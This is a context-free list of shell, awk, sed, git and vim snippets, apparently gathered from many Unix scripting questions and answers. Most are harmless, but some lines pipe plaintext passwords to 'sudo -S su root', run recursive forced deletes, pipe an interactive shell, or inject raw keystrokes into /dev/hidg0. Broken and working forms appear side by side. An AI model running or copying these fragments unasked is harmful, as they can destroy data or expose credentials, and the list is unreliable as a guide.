ALERT line125: Alert: Cannot locate any description for 'asdf' in the qwer.xml hierarchy. (due to (?i-xsm:\balert?\b) ALERT in ../hgfd.controls) ALERT line126: Alert: Cannot locate any description for 'zxcv' in the qwer.xml hierarchy. (due to (?i-xsm:\balert?\b) ALERT in ../dfhg.controls) ALERT line127: Alert: Cannot locate any description for 'rtyu' in the qwer.xml hierarchy. (due to (?i-xsm:\balert?\b) ALERT in ../kjgh.controls) [1] 22280 IGNORE total: 0 WARN total: 0 ALERT total: 3 ERROR total: 23 [1] + Done /tool/pandora/bin/gvim -u NONE -U NONE -nRN -c runtime! plugin/**/*.vim -bg ...
grep -P
ERR_COUNT=$(echo $VAR_WITH_TEXT | perl -pe "s/.*ERROR total: (\d+).*/\1/g")
ERR_COUNT=$(echo $VAR_WITH_TEXT | sed -n "s/.*ERROR total: ([0-9]+).*/\1/gp")
\( ... \)
grep '\d'
at 19:00 <<! echo "job 1"
awk -v FS=';' -v OFS=';' '{for (i = 2; i <= NF; ++i) { print $1, $i }}'
$"Hello, World"
$"Hello, World"
service somename start,
somename start
set -x
brew install findutils
port install findutils
use /opt/python
use python
forget python
def command = 'some_shell_script.sh param1 "report_date=`some_function 0 "%Y%m%d_%H%M%S"`'
wc -l
grep -E
grep -F
grep -P
grep -P
grep [OPTIONS] "$(quote [STRING])"
grep 
grep -E
grep -P
sed 
 "s/$(quote [STRING])/.../"
git gc
git gc
git gc
awk 'BEGIN...'
foo bar
foo bar
./script 'this is a line'
./script "this is a line"
pkill -P$$
pkill -P$$ cvlc
read -p event
THIS IS A #FOO
THIS IS A #FOO
sort -k12 -t~
ls | grep 'my_word'
hi Visual
hi Cursor
awk '/http/'
> out
tail -f
ping google.com -n 10 | grep Minimum >> output.txt
Minimum = 29ms, Maximum = 46ms, Average = 33ms
Minimum = xx ms, Maximum = yy ms, Avrage = zz ms
rtt min/avg/max/mdev = 5.953/5.970/5.987/0.017 ms
| awk '{print $1}'
Average = [[:digit:]]+ms
Server "$N":
self_modify( bool )
self_modify( bool )
print "foo";
print "foo"
system("sleep 20 && echo from-sh & ")
kill -0
kill -0 $PID
kill -0
$0 !~
{ print }
/@ /!b
s#\(.\{10\}\)[^:]*\(:.*\)#date --date=@\1 +%Y/%d/%m-%H:%M:%S"\2"#e
eval "${run2}"
killall -9
kill -9
kill -9
seq [-w] [-f format] [-s string] [-t string] [first [incr]] last
seq -w
seq -w 1 9
1 2 3 4 5 6 7 8 9
seq -w 1 09
seq -w 000 010
seq -w 10 -1 01'  for 10,09,08...01  or
seq -f "%02g" 0 10
seq -f "%03g" 0 10
read name
read email
php -r 'while(1){sleep(1);echo PHP_OS;}
process C
process B
posix_kill($pid, SIGKILL)
process B
process B
process C
broken pipe
process C
php limit.php "strace php -r 'while(1){sleep(1); echo PHP_OS;};'" 1
php -r 'while(1){sleep(1);}
broken pipe
process B
sed -i 's/--/–/g' *.txt
gem install ttfunk
"Caution: IN="
sort -u
alias latest.trc='less <path to file>
stat -l
man stat
cacheme <cmd>
echo $outputString
bash t.sh
while read line
while IFS= read -r line
(?{ code })
man perlre
declare -a
ls 1* | find . -type d | awk '{print("mkdir "$1)}' | sed 's/[0-9][0-9][0-9]*/0&/2'
ls 1* | find . -type f | awk '{print("mv "$1" "$1)}' | sed 's/[0-9][0-9][0-9]*/0&/2'
rename -n 's/[0-9][0-9][0-9]/0$&/g'
` `
$( )
timeout 60 bash -c 'until echo > /dev/tcp/myhost/myport; do sleep 5; done'
exec bash -i | pirate
[result status] = perl('my_perl.pl')
ls /etc
ls /etc/
ls -laR | grep "^[-l]"
[files for root, dirs, files in os.walk('/etc')]
ls -laR
for filename in *
find . -mindepth 1 -maxdepth 1 -type d
wc -l
wc -l
ls -l
ls -A
ls -a
awk  '/#START/{flag=1} flag{print} /#END/{exit}' your_file
gawk -v RS='[[:space:]]+' -v ORS=' ' '/#START/{flag=1} flag{print} /#END/{exit}'
eval cp $1 $2
man bash
mycp "*sh*" aa
cp /some/where/*sh* .
"-e", "'drop", "table", "table_name'"
VAR in $list
error building trees
uname -r
pkill ccpd
/etc/init.d/ccpd stop
kill -9
/etc/init.d/ccpd stop
sudo service ccpd restart
NR%2==0 {print ""}
BEGIN {RS=""}
$1 to $NF
echo "$CMD"
echo $CMD
foo -n \"a b c.txt\"
"a b c.txt"
(echo zzz & echo aaa & echo kkk) | sort
echo diskpart_command
Error Percentage
Error Percentage
Error Percentage
No Error Percentage
vi editor
sh -x chart.sh
-n 1
xargs -L1 -P10
touch $MCPATH.lock
shopt -s extglob
ls *.{mp3,ogg}
find ~ -iname '*.{mp3,ogg}'
find . -print0 
xargs -0 file -F '//'
file -F '//'
awk -F '//' '...'
temp folder
chart.html file
temp folder
for /?
:set fileformat=unix
gedit .bashrc
printf '%(url)q' '...data...'
svn switch
--username $USERNAME
history 1
cd /Volumes/VolumeName
cd /Volumes/VolumeName
echo $?
cd /Volumes/$VOL && {sudo rm -fr .{,_.}{fseventsd,Spotlight-V100,Trashes}; mkdir .fseventsd;}
sudo rm -fr .{,_.}{fseventsd,Spotlight-V100,Trashes}
man 1 bash
{ sudo ...
{sudo ...
sort -k
man sort
2> /dev/null
ssh -o PasswordAuthentication=no $REMOTE_HOST_IP 2> /dev/null
git commit
git tag
git describe
shred $TIMES
shred -n $TIMES
./script.sh in.txt
echo "$RESULT"
echo $RESULT
#die, somehow
#die, somehow
#outer subshell
kill 0
echo "out"
mv folder2/*.* folder
find folder2 -name "*.*"
find folder2 -name '*.*' -exec mv \{\} /dest/directory/ \;
$ ls|grep RadF|xargs mv -t ../fd/
timeout 3 ls
sleep 10
attach one file
echo messages
mailx and uuencode
sh -x chart.sh
sh -x chart.sh
/tmp folder
chart.html file
html file
Content-Disposition: inline
java -jar /home/jars/jarfile.jar
java -jar /home/jars/jarfile.jar
hive sql query
chmod +x ~/bin/rgrep
rgrep TAIWAN .
grep -v
grep -r
--x11-display :0.1
echo ok
tail -f
echo 5
echo 5
LOAD DATA INFILE ...
read fname sname age
NR % 3==0 {print("")}
1133+anything else
newperl [filename]
convert -units PixelsPerInch 75 -resize 200x200 ~/filepath/*.jpg ~/filepath.*jpg
"{}" "{}"%03d.jpg
sort | uniq -u
cat reference_file reference_file
alias mysqlstart='sudo /opt/local/bin/mysqld_safe5 &'
$ mysqlstart
GNU bash, version 4.2.37(2)-release (i386-apple-darwin11.3.0)
sudo -b
alias mysqlstart='sudo true; sudo /opt/local/bin/mysqld_safe5 &'
sudo true
declare -p
compgen -A variable
STRING_INT_ALIST other_token_alist[]
enum r_instruction
SOMEVAR=foo yourcommand
> yourfile
>> yourfile
execv(yourprogram, yourargs)
-name *.xml
count / total_lines = 0.000000
uniq -u
help history
man bash
history -a
printf -v
declare -g
/usr/bin/timeout 10 scala -version
< 1
man timeout
set env
exit 5
log_user 0
git status
ui = true
bad interpreter: No such file or directory
sed -n l filename
exec('echo $$')
echo 1538
echo $$
rm -d
rm -R
rm -d
rm -R
rm -d
rm -R
rm -d
rm -R
rm -r
hive -e
echo $DATE_YEST_FORMAT1
first Hive SQL query
second Hive SQL query
120 seconds
first query
stopped automatically
username = value2
String Pattern
10000 files
particular pattern
particular string pattern
dat.gz file
dat.gz file
10000 files
10000 files
String Pattern
100 files
100 files parallelly
gzcat .... | wc -l
set -m
#this is comment
echo >(ls)
echo /dev/fd/63
echo >(ls)
git pull
> /dev/null
-o -name .git -prune
-a "{}" != "."
echo $latex
echo "$latex"
grep -v "Linux extended"
line 34: [24: command not found
if ["${counter:-0}" -gt 21] ;
man bash
help test
[[ 2 -gt 1 ]]
(( 2 > 1 ))
type command_not_found_handle
#### - string.txt
java -jar foo.jar
head -1
chmod +x
java Test
java Test
bind '"e[A": history-search-backward'
sudo su -c 'echo "bind \'\"\\e[A\": history-search-backward\'" >> /etc/profile' -
su: user '"\e[A": does not exist
echo bind \'\"\\e[A\": history-search-backward\'" >> /home/user/testfile
sudo su
sudo sh -c …
screen -list | grep 'tached)'
cut -d '.' -f 2
%' '
case esac
"the best thing"
exec 3<&-
exec 3>&-
help read
read <&3
read -u3
foo bar
"foo bar"
'foo bar
$(mktemp /tmp/vmlinux-XXX)
$(mktemp /tmp/vmlinux-XXXXXX)
/path/to/kernel/tree/scripts/extract-vmlinux <kernel image> >vmlinux
NM=nm /path/to/kernel/tree/scripts/mksysmap vmlinux System.map
"$(echo '\037\213\010\000')"
svn copy
svn copy <dir_to_be_branched> <branch_path>
sudo apt-get remove ffmpeg x264 libvpx libav-tools-dev libx264-dev
Would you like to continue [Y / n]?
echo -e "Y\r"
sudo apt-get remove ffmpeg x264 libav-tools libvpx-dev libx264-dev
apt-get --help
grep -vxF -f file1 file2
man grep
[two spaces]
string-join(..., "/")
kill -TERM -1234
pidof nginx
ps aux | grep -c '[n]ginx'
wc -l
find . -type f | xargs -n1 basename | fgrep . | sed 's/.*\.//' | sort | uniq -c | sort -n
-maxdepth 1
{print $1}
notes --complete
shopt -s exglob
set -x
javac file_name.java
awk 'END {print NR,"lines"}' filename
awk 'END {print NR}' filename
-r dynamic
-r   dynamic
shift $(expr $OPTIND - 1)
"a" "b"
"a b"
set -x
set +x
./myscript -stop
-regextype posix-extended
mkdir moose
for x in $(ls)
for x in *
GNU sed
.*- \(.*\) -.*
cat README.md | marked --gfm
mkdir $dir
which gcc
if [ "$2" = "$3" ];then echo true; else echo false; end
r=$(string equal a z)
invalid command name
for i in {1..10}; do ~/bin/foo.bash & ; done
bash: syntax error near unexpected token ;
-n 1
make -j N
trap 'echo "exiting" ; rm -f $lockfile ; kill 0 ; exit' INT TERM EXIT
q( a ( b ) c )
q xabcx
shift $((OPTIND - 1))
$1, $2, ...
for file in f1 f2 f3; do cat $file; echo; done
cat /tmp/err
cat /tmp/log |awk '!x[$0]++'|
a.x b.x
a.x & a.x
for ... in
fileNum=$(ls -l *.pdf | wc -l)
echo $fileNum
<whatever command you use to fetch it form the database> | ssh-add -
ssh-agent -l
wc -m
wc -m
[[ ]]
[ ]
if ... then ... else ... fi
chmod +x script.sh
. / vlc $ name> $ file
Ctrl + Tab
svn update .
svn update /path/to/project/Live
set -x
man read
read -r
/usr/bin/time -f %e sh -c "my command > /dev/null 2>&1"
2>&1 >/dev/null
man bash
It says Demo is a directory
grep -i
bash -c your_bash_file.sh
-k 2,2
while loop
grep -E
cut -d' ' -f2
whereis yum.repos.d | awk -F: '{print $2}'
readLogs.sh "log.total" "1 week ago" "today"
date +%s --date "date string"
find . -name '*TXT' -exec ls '{}' \; | wc -l
shell scripting
process watchdog
./path_to_script.sh -start
-exec cp {} $TARGET_DIR +
chmod +x
chmod a+x /usr/local/bin/myalias
frobnicate foo bar baz
-maxdepth 0
sed '1,'"$minNrOfFiles"'d'
-mtime +"$ageLimit"
[ ]
[[ ]]
Also - under what circumstances should [ ] be used vs. [[ ]] and vice versa?
$1 $2 $3
git add *.erb
git add '*s.rb'
git add *s.rb
git add
git add
if [
diff old new
(FORMAT ...)
sh search2.sh "these are some search terms"
sh search2.sh "these are some search terms" | head
find . -type d -print | grep '_[0-9]*_'
grep -E
cat timing_deleted.csv
-n 10
MB1 00134141
while mapfile ...; do
cat filetomerge.txt | awk -f merge.awk
alias bs="echo \'{'\"'account'\"':'\"'a1'\"','\"'portfolio'\"':'\"'p1'\"'}\' | nc 0 9000"
echo '{"account":"a1","portfolio":"p1"}' | nc 0 9000
(  )
" "
while ... done
tail -n +1 -f your_log_file | xargs | myscript.sh
awk '{if (/LUN$/){ prefix = $0; getline; prefix = prefix " " $0 } else {print prefix, $0} }'
/LUN$/{N;y/\n/ /;h;d}
s/^\([^\n]*\)\n\(.*\)/\2 \1/
BEGIN {RS=""; FS="\n"}
{for(i=3; i<=NF; i++) {print $1,$2,$i}}
< <( ... )
--max-redirect 0
[    2.460353] sd 1:0:0:0: [sdb] Attached SCSI disk
[    2.461348] sd 2:0:0:0: [sdc] Attached SCSI disk
[    2.464181] sd 0:0:0:0: [sda] Attached SCSI disk
./script 10 50
./script 10-50
nohup my_app &
strace -f -o out
truss -f -o out
continue = on
tries = 3
cat -
bash -c '...'
xyz | echo "..."; cat
http 80
2>&1 >> $logfile
!ls, command not found.
shopt -s histverify
set -o history ; set -o histexpand
bash 4.x
set -o ...
/bin/tcsh -l
sed -i
UNLOCK TABLES;
sed -r
man sed
sed -E
else if
Directory created
Directory created
[ "$PWD" == "/" ]
while if
ssh -t ....
do_echo $line
rails runner
rails runner ./generatedata.rb
#!/usr/bin/env rails runner
rails runner
injector input.conf super.conf
Process proc = rt.exec( new String [] {"C:\\cygwin\\bin\\bash.exe", "-c", "C:\\scripts\\login.exp"});
Process proc = rt.exec( new String [] {"C:\\scripts\\login.exp"});
printf "%0.20f\n" 41.495
printf "%0.20f\n" 41.495000000000000001
ln (LN)
In (IN)
mysql --help
' bar foo ' | grep baz
eval "$sql"
date +%Y%m%D
date +%Y%m%D
export -f DATEMACRO
pkill cat
mysql -e
mysql --execute
mysql -e
mysql --silent
while read
mysql -e
mysql --silent
php -f ..
#<-- Line 51
which grep
which sed
<a href="../../../external.html?link=http://www.twitter.com">
<a href="../../external.html?link=http://www.facebook.com/pages/somepage/">
<a href="../external.html?link=http://www.tumblr.com/">
<a href="http://www.twitter.com>
first file second file
a b c
d e f
ls -ail
ls -dil
"$1" "$2"
the clipboard
the clipboard as text
do shell script
shopt -u xpg_echo
getconf ARG_MAX
do shell script
Host *+*
ssh -v
ssh -v
<a href="[^<>]*">[^<>]*</a>
python run.py 0 200000 &
python run.py 0 200000
"0 Enter a command: {1..9} $(ls)"
"Enter a command:"
1 2 3 4 5 6 7 8 9 <directory contents>
a='hello world' test.sh
print $0
sed -i ...
sed -i
FILE *
cd ~
test -d "~/some_dir"
/bin/bash cd ~
cd ~
/bin/bash cd ~
rvm alias create default 1.9.3
ruby -v
rvm use
dir: /present/directory
COMMAND="ls -l | awk '{print \$8 \$9}'"
echo $(eval $COMMAND)
eval $COMMAND
ps -C firefox-bin
ps aux
'hello world'
'hello world'
hello\ world
ssh-keygen -F <hostname>
ls -al
$(ls -A)
ls -al
ls -Al
if [ -n "$(ls -Al)" ]; then
$(/bin/ls -Al)
ls -la
ls -al
if [[ $(ls -A | head -c1 | wc -c) -ne 0 ]]; then ...; fi
if [[ $(ls -A | wc -c) -ne 0 ]]; then ...; fi
ls -al
ls -Al
ls -A
ls -al
ls -Al
ls -A
using head -c1
head -c1
ifne -n
cd foobar; ./something & wait
-e 'sh -c "actual command"'
python -c
python -c "print ('⚤'')"
python -c "print ('⚤')"
awk '$0 ~ p { gsub(p, r); t=1} 1 END{ exit (!t) }' p="$pattern" r="$repl
old pattern
new pattern
export NBR_PROCESS=2
env YOURVAR=1 yourprogram yourarguments
. filename [arguments]
source filename [arguments]
networking restart
res = br.open("https://myapp.url.com/login", data=...)
br.set_cookie("cookiename=cookievalue; expire=Wednesday, 13-Feb-13 15:00:00 GMT")
ruby -v
ruby 1.8.7 (2012-02-08 patchlevel 358) [universal-darwin12.0]
rvm -v
rvm 1.15.7 (stable) by Wayne E. Seguin <wayneeseguin@gmail.com>, Michal Papis <mpapis@gmail.com> [https://rvm.io/]
brew upgrade ruby
rvm install 1.9.3
rvm install 1.9.3 --with-gcc=clang
You requested building with 'clang' but it is not in your path.
s/|/ /g
/$a=$1;$a=~s! !_!g; $a
s/ /_/4g
s/_\([^_]*\)_\([^_]*\)$/ \1 \2/'
s/\( [^ ]*\)\{2\}$/\n&/
s/ /_/4g
type __git_ps1
cat /sys/block/sda/queue/hw_sector_size
man sfdisk
The default value of size indicates "as much as possible"
/dev/sda : start=2048, type=83
sudo blkid
man bash
man getopt
brew install gnu-getopt
brew link --force gnu-getopt
. ~/.bash_profile
echo $FLAGS_GETOPT_CMD
$filename | cut -f1 -d'.'
|sed -e 's/\.[^./]*$//'
|sed -e 's/\.[^/]*$//'
tmp1=${filename##*/};tmp2=${tmp1:1};filename_noextension=$(echo -n ${tmp1:0:1};echo ${tmp2%.*});echo $filename_noextension
filename=.bashrc; echo "filename: $filename"; tmp1=${filename##*/};tmp2=${tmp1:1};filename_noextension=$(echo -n ${tmp1:0:1};echo ${tmp2%.*}); echo "filename without extension: $filename_noextension"
filename=.bashrc.txt; echo "filename: $filename"; tmp1=${filename##*/};tmp2=${tmp1:1};filename_noextension=$(echo -n ${tmp1:0:1};echo ${tmp2%.*}); echo "filename without extension: $filename_noextension"
filename=.bashrc.txt.tar; echo "filename: $filename"; tmp1=${filename##*/};tmp2=${tmp1:1};filename_noextension=$(echo -n ${tmp1:0:1};echo ${tmp2%.*}); echo "filename without extension: $filename_noextension"
filename=~/.bashrc; echo "filename: $filename"; tmp1=${filename##*/};tmp2=${tmp1:1};filename_noextension=$(echo -n ${tmp1:0:1};echo ${tmp2%.*}); echo "filename without extension: $filename_noextension"
filename=~/.bashrc.txt.tar; echo "filename: $filename"; tmp1=${filename##*/};tmp2=${tmp1:1};filename_noextension=$(echo -n ${tmp1:0:1};echo ${tmp2%.*}); echo "filename without extension: $filename_noextension"
filename=bashrc; echo "filename: $filename"; tmp1=${filename##*/};tmp2=${tmp1:1};filename_noextension=$(echo -n ${tmp1:0:1};echo ${tmp2%.*}); echo "filename without extension: $filename_noextension"
filename=bashrc.txt; echo "filename: $filename"; tmp1=${filename##*/};tmp2=${tmp1:1};filename_noextension=$(echo -n ${tmp1:0:1};echo ${tmp2%.*}); echo "filename without extension: $filename_noextension"
filename=bashrc.txt.tar; echo "filename: $filename"; tmp1=${filename##*/};tmp2=${tmp1:1};filename_noextension=$(echo -n ${tmp1:0:1};echo ${tmp2%.*}); echo "filename without extension: $filename_noextension"
filename=~/bashrc; echo "filename: $filename"; tmp1=${filename##*/};tmp2=${tmp1:1};filename_noextension=$(echo -n ${tmp1:0:1};echo ${tmp2%.*}); echo "filename without extension: $filename_noextension"
filename=~/bashrc.txt.tar; echo "filename: $filename"; tmp1=${filename##*/};tmp2=${tmp1:1};filename_noextension=$(echo -n ${tmp1:0:1};echo ${tmp2%.*}); echo "filename without extension: $filename_noextension"
read -t 0
othercmd "$@"
printf %q
printf %q
set -- "$arg" "$@"
set -- "$@" "$arg"
netcat -lu 6791
netcat -vv -lu -p 6791
a | b | c
echo -e "a3\na4"
set +m
echo "$ret"
trap EXIT
[[ $COMPREPLY == */ ]] && compopt -o nospace
mdutil -E
stat -f "%m" $MYFILE
if [ -d .git/refs/remotes/faraway ]; then ...
git remote
git ls-remote faraway
git remote
timeout 30s
git ls-remote --exit-code "$REPO_URL"
git init
git ls-remote
git ls-remote --tags
time git ls-remote --symref origin HEAD
python program
command substitution
$(command to run your program)
samtools mpileup -q 1 -f XXXX YYYYY
echo "${SOME_VAR}"
(start line)
(end line)
(start line)
(end line)
man bash
rename "extra.test" "" *
rename 's/extra.test//;' *
./first.sh; echo something
./script1.sh && ./script2
./script1.sh || ./script2
pkill -f
ftp -nv $FTP_HOST 1>>ftp.log | logger<<END_FTP
shopt -q
shopt -s extglob
shopt -u extglob
shopt -p
set +o
shopt -p -o
[[ ... ]]
(( ... ))
TEXT="sample text"
./transfer.sh "echo $TEXT >> test.log"
"rm -r /home/alan/papers"
cmd > /dev/null
3> "$file"
[ -e "$file" ]
ls file*
sed -n 's/file\([0-9]*\)/\1/p'
sort -rh
head -n 1
git clone ...
git clone ...
cut -f2 -d " "
echo "one" | cut -f 2 -d " "
cut -f 2- -d " "
if () then ... fi
man bash
man test
brew install coreutils
10 seconds
0 hours 0 minutes 10 seconds
$(( jobend - jobstart ))
jobs -p
ksmon | {various filters} | gzip -c > file
jobs -p
while IFS= read
IFS=; while read..
[[ -n $1 ]]
./script.sh file1
./a.out | grep foo
./a.out 2>&1 | grep foo
mate <filepath>
git commit
/usr/local/bin/mate -w
/usr/local/bin/mate -w
which mate
open -a TextMate.app -w
command &> /dev/null
FNR == NR {arr[$1] = $2 " " $3; next}
for (lookup in arr) {if ($0 ~ lookup) {
split(arr[lookup], a)
print "Here I want to add " a[1] " and " a[2]
export yourname=yourlist
$ man grep
cd test
cd cd test
command -v
command -v
type -a
man logrotate
bash backup.sh
echo ${${input//  / }#* }
$ man something
man grep
$ less filename
mkfifo mypipe
tail -f mypipe | ssh -t -t user@somehost.com
echo "ls -l" > mypipe
./my-program > /path/to/mypipe
-t -t
comm -23
for f in "$( find $source -type f -name '*' -print )"
-name '*'
20120831 - daily
backtic substitution
'+' u ... every ::0::0
emulate bash
emacs -nw
BASH_ENV=~/.bashrc emacs
[ -z "$PS1" ]
set -o noglob
echo -e
set -o noglob
noglob  Same as -f.
-f      Disables file name generation.
GNU sed
fiz dir/buz
rename ".js" "" *.js
echo "$*"
bash script.sh arg0 ... argn
man bash(1)
set -x
ps -ef | …
ps -o pid= -o comm=
fixit = (line.strip() == "")
" "
if fixit and line.strip()
print open("input.txt").read().replace('\n\n', '\n\n$')
myPerlScript 10 42
myPerlScript myarg1=10 myarg2=42
myPerlScript -myarg1=10 -myarg2=42
myPerlScript myarg1 10 myarg2 42
myPerlScript -myarg1 10 -myarg2 42
myPerlScript myarg 10x20
myPerlScript myarg=10x20
myPerlScript -myarg 10x20
myPerlScript -myarg=10x20
myPerlScript -myarg=10 20
myPerlScript -myarg=10,20
TITLE= "$1"
find -path '*/A/B' -execdir {} \;
declare -a dict
declare -A
$[ ]
$(( ))
for word in $(cat $1)
$(cat "$1")
man 1 printf
man 3 printf
ln -s ~/Documents/ Documents
#!/usr/bin/env bash
arecacli64 disk info
arecalcli64 disk info
cd /home/user/tests; make all
make all
$( )
/cat/ && c == 0 { c = 1; ... }
nyan cat
Adele - 21 [2011] flac/
Adele - 21 [2011] flac
Adele - 21
./manage.py [command]
python manage.py [command]
chmod a+x manage.py
manage.py [command]
which python
grep -v
sed -i 's/---/\n/g'./"$SHORT"Diff.txt
sed: -e expression #1, char 11: unknown option to 
uname; sed --version
GNU sed version 4.2.1
set -x
screen -list
screen -S "TEST"
screen -list "TEST"
PID.SCREEN NAME
hello there
foo1 -o "file with space.txt"
foo2 -o "file with space.txt"
foo2 -o file\ with\ space.txt
man bash
set -u
binary with some args
{ }
[ $fileSeconds -lt $keepSeconds ]
(( $fileSeconds < $keepSeconds ))
bash -x your-script.sh
echo "$f"
echo $f
echo -e
Unknown Command
mv: target ‘4-09-12.tar.gz’ is not a directory
date +%d-%m-%y
| tail -n +3
apt-get install cloud-utils ec2-api-tools
curl -F "file=@localfile;filename=nameinpost" url.com
wc -l
while read
!bash -prompt "subshell"
help shell
help 'shell'
PS1="subshell "
let $PS1="subshell "
PS1="subshell "
set shell=bash\ --rcfile\ ~/.vimbashrc
:PS1="subshell$ " bash
:!bash\ --rcfile\ ~/.vimbashrc
no current job
-type f
ssh asimplecommand
Authentication succeeded
man 2 getppid
help .
brew info ruby
brew info ruby
-us -uc -b
R CMD check
for do
for do
fmt -1
cat -e
echo a a b | fmt -1 | uniq
... | fmt -1 | uniq | ...
ruby gem
cd abc
git init
git push
git push
git checkout branch_abc
sh file.sh
echo "<$TITLE>"
echo "$TITLE"|od -xc
You have already got the dictionary.
as alias
<is last file>
${files[@]: -1:1}
: -
( ff="" ; for f in * "" ; do [ -n "$ff" ] && echo $(${f:+false} && echo $ff alternate params here || echo normal params $ff ) ; ff=$f ; done )
command C
command V
xargs locate
pseudo anonymous function
Tests run: 0
declare -A
export MESSAGE="Hello World"
Edit Configurations
Run Configurations
environment variables
condition { action }
NR <= 1000
-F -x
screen -r
man re_format
[[ =~ ]]
rename 's/-\((.{3})\)-(.{3})/-$2-$1/' *.doc
sh watch.sh
echo "hi"
sudo -s
source /etc/profile
sudo java
sudo update-alternatives --install java java /path/to/java/home/bin/java
alias java='/usr/java/latest/bin/java'
echo $PATH
$ cd *
$echo *
$set -o noglob;echo *;set +o noglob
set +o noglob
% ./thisscript . \*.csv oldword newword
bash script.sh
-d --data
daycounter=$(( ($(date +%s) / (60*60*24) ) % 20))
$1 $2 $3 … ${N}
$1 $2 $3 … ${N}
"$1" "$2" "$3" … "${N}"
var="value with spaces"
tmp=$(expr ...)
echo ""
aajob1 bbjob3 ccjob6
fortune -f
ps -p PID -o lstart=
touch /<dir>/<filename.ext>
mv <source> <target>
hash -r
export VAR="VALUE"
printf '%-10s' "csci" "csc" "Line #" "File Name" "\n"> "$1 3.txt"
grep --color=always
File.Copy(@"c:\Program Files(86)\Program Folder\mydll.dll", @"C:\mydll.dll");
File.Copy(@"c:\Program Files(86)\Program Folder\mydll.dll", @"C:\mydll.dll",true);
export -p
echo "date...
error handling mechanism
git summary
awk '{printf "%5d\t%s", $1, $2}'
git shortlog -n -s
if [[ "$#" = "2" && "$1" =~ ([^-a][^-b]) && "$1" =~ ([^-c][^-d]) ]]
echo -e \\x00\\x00\\x07\\x04\\x00\\x00\\x00 > /dev/hidg0 && echo -e \\x00\\x00\\x00\\x00\\x00\\x00\\x00 > /dev/hidg0
shell.exec("echo -e \\x00\\x00\\x07\\x04\\x16\\x06\\x00 > /dev/hidg0 && echo -e \\x00\\x00\\x00\\x00\\x00\\x00\\x00 > /dev/hidg0");
$(substr a,b,c)
. script.ksh
$ . ./kv-sh
REPLACE INTO
REPLACE INTO...
CREATE TABLE
Cut everything before the cursor
Move cursor to beginning of line
Move cursor to end of line
Move cursor back one word
Move cursor forward one word
Cut the last word
Cut everything after the cursor
Paste the last thing to be cut
man bash
grep -r
alias rgrep="grep -r"
<some word here>
Permission Denied
cron job
error/exception handling mechanism
some other scripts that will be dependent on the data provided by above script
get notified if anything wrong has happened
cluster is having some maintenance
set -e
COMMAND || true
sed s/
bindkey "^X\\x7f" backward-kill-line
Preferences -> Keys -> Key Bindings
svn help
svn export
cd; cd -
command &
exec command &
wait $!
prefix=$(longest_common_prefix name1 [name2 ...])
suffix=$(path_without_prefix /pre/fix /pre/fix/to/file [...])
git clone "ssh://$u$p$DIR"
expect -re
mysql -Bse "select..."
SELECT CONCAT(..)
awk '{print $(NF-1)}'
-f 6
-d, --delimiter=DELIM
-f, --fields=LIST
[0-9.]\+ seconds
\([0-9.]\+\) seconds
man bash
Pathname Expansion
mt-auth --stuff etc
/usr/bin/stat: cannot execute binary file
stat "$some_filename_with_spaces"
sh -c
au BufWritePost *.slim silent !slimrb % > $(echo % | cut -d'.' -f1).html
au BufWritePost *.slim silent !slimrb % > %:r.html
silent !slimrb % > %:r.html
find ./ -name $1
ff *.xml
´echo "ls"´
echo "ls"
find ./ -name *.xml -print
ruby my-script.rb
* * * * * cd /to/script/directory;/usr/local/rvm/rubies/ree-1.8.7-2011.03/bin/ruby ./my-script.rb
* * * * * /bin/bash -l -c 'cd /to/script/directory;/usr/local/rvm/rubies/ree-1.8.7-2011.03/bin/ruby ./my-script.rb'
man bash
egrep -o ([0-9|a-Z]*)
ls -h
"${grep '$STRING'}
grep 'text'
grep '$var'
${grep $var}
ls *.jpg
-f -
foobar foobaz
Command: awk -F, -f find_duplicates.awk duplicates
for (k in a)
for (k in a)
-n +0
test="$test $data"
select * from <table>
1 2 3 4 5 6 7
diff --help | less
man diff
printf '%s\n'
> /dev/null 2>&1
set -vx
< /dev/null
> /dev/null 2>&1
< /dev/null
$PROG --version
$PROG --version
$PROG --version
$PROG --version
$PROG --version
sed 's/bbb\tbbb\nccc\tccc/eee\teee/g' foo*.txt
file descriptor 0
file descriptor 0
-b 781k
-b 1562k
ps ef
ps rf
ps rf
ps rf | grep -v ' \\_ '
-C <process>
man stty
stty -a
test -z string
test -s file
file filename
/usr/local/bin/monit --version
"Do you want output to go to | or to tail"
Command 2
command 1
login root
echo $pass | sudo -S $command
echo $pass | sudo -S login root
echo "1234" | sudo -S su root
echo "1234" | sudo -S su
login root
cp -r
if else
"+%b - %d days"
-1 3
column -t
column -t
lynx www.something.com -accept_all_cookies -cmd_script=bar.txt
./script your_string
<form> ... </form>
git gui
git gui
set -H
set -o history
cd /home/username/files
shell-expand-line (M-C-e)
-1 1
-2 2
-t ';'
-e -
-o '1.1 1.2 1.3 2.1 2.2 2.3 2.4 2.5 2.6 2.7'
-a 2
ssh user@remote bash -l -c foo_func
bash -l
grep -v
grep -v grep
php go_get.php
ls -Q
-exec rm -rf {} \;
rm -rf
man xargs
rm -rf $(find . -name "*.swp")
one | two
one >tmp; two <tmp
cmd | rm
for dir in *; do
|sort | uniq
grep -o
svn cat
curl http://example.com/huge_file.txt | python <(svn cat file://$REPO/trunk/my_script.py) --argument1 --argument2
python my_script.py
python <(cat my_script.py)
ls -1
command | sed 's;^.*_;;'
-z $foo
sudo apt-get git
git check[tab]
brew install bash-completion@2
brew install bash-completion
sudo port install git +bash_completion
export PS1='\W$(__git_ps1 "[%s]")
unknown option: --list-cmds=list-mainporcelain,others,nohelpers,alias,list-complete,config
brew install bash-completion
git config
-H 'Cookie: <somestuff>'
-c login_cookie.txt
curl -b login_cookie.txt <url_that_requires_log_in>
gcc program_name
"some string"
shell (bash)
goto comment
: comment
: ${var=VALUE}
set- e
|| :
--cmd "arbitrary vimscript command here"
-S "/path/to/file"
read (symbol)
read (symbol)
(not A-Z or a-z)read (CJK symbol)
my $name
set +e
screen STAF
screen -ls
screen -r ...
sh -x /home/root/Desktop/BBTCP/out/vehicleDetect
od -xc /home/root/Desktop/BBTCP/out/vehicleDetect
awk -f script.awk file1 file2
FNR == 1
:help mksession
:mks /path/to/mysession.vim
$ vim -S /path/to/mysession.vim
$ vim -c "so /path/to/mysession.vim"
:so /path/to/mysession.vim
chmod +x
seq -f "%7.0f"
seq -f "%.0f"
$(find . -type d)
cd $i
$i >> missing
ls -l missing
-rwxrwxrwx+ 1 Username None 0 Sep 13 16:45 missing
cd $i
$i >> missing
echo "$i" >> missing
find . -type -d
cd $1
cd -
$i >> missing
echo $i >> missing
cp: 'cover.jpg' and 'cover.jpg' are the same file
du -b
